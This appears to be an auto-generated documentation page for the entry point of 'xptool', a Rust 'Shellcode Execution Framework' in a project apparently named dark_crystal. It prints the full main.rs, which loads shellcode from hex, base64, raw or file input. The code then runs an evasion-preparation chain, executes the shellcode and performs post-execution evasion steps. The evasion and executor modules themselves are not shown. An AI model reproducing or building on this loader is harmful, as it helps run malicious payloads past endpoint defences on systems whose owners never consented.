# main

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/tools/xptool/src/main.rs` |
| **Lines** | 93 |
| **Cards** | T023-client-capabilities |
| **Role** | Entry point, FSM bootstrap |

## Internal Functions

- `main` (line 13)
- `load_shellcode` (line 61)

## Key Dependencies

- `use anyhow::Result;`
- `use clap::Parser;`
- `use config::{CliArgs, ExecMethod, InputFormat};`
- `use evasion_chain::EvasionChain;`
- `use executor::Executor;`
- `use shellcode::ShellcodeSource;`

## Full Source

```rust
mod config;
mod evasion_chain;
mod executor;
mod shellcode;

use anyhow::Result;
use clap::Parser;
use config::{CliArgs, ExecMethod, InputFormat};
use evasion_chain::EvasionChain;
use executor::Executor;
use shellcode::ShellcodeSource;

fn main() -> Result<()> {
    let args = CliArgs::parse();

    if args.debug {
        println!("========================================");
        println!("  xptool - Shellcode Execution Framework");
        println!("========================================");
        println!();
    }

    let shellcode = load_shellcode(&args)?;

    if args.debug {
        println!("[+] Shellcode cargado: {} bytes", shellcode.len());
        println!("[+] Metodo de ejecucion: {:?}", args.method);
        println!();
    }

    let profile = args.evasion_profile();
    let chain = EvasionChain::new(profile);

    if args.debug {
        println!("[*] Fase 1: Preparacion de evasion...");
    }
    chain.execute_preparation()?;

    if args.debug {
        println!();
        println!("[*] Fase 2: Ejecucion del shellcode...");
    }

    let executor = Executor::new(args.method.clone(), args.debug);
    executor.execute(&shellcode)?;

    if args.debug {
        println!();
        println!("[*] Fase 3: Post-ejecucion...");
    }
    chain.execute_post_execution()?;

    if args.debug {
        println!();
        println!("[+] Ejecucion completada.");
    }

    Ok(())
}

fn load_shellcode(args: &CliArgs) -> Result<Vec<u8>> {
    let input = args
        .input
        .as_ref()
        .ok_or_else(|| anyhow::anyhow!("No se proporciono input de shellcode. Usa -i <input>"))?;

    match args.format {
        InputFormat::Hex => {
            if args.debug {
                println!("[*] Decodificando shellcode desde hex...");
            }
            ShellcodeSource::from_hex(input)
        }
        InputFormat::Base64 => {
            if args.debug {
                println!("[*] Decodificando shellcode desde base64...");
            }
            ShellcodeSource::from_base64(input)
        }
        InputFormat::Raw => {
            if args.debug {
                println!("[*] Usando shellcode como raw bytes...");
            }
            Ok(input.as_bytes().to_vec())
        }
        InputFormat::File => {
            if args.debug {
                println!("[*] Cargando shellcode desde archivo: {}", input);
            }
            ShellcodeSource::from_file(std::path::Path::new(input))
        }
    }
}

```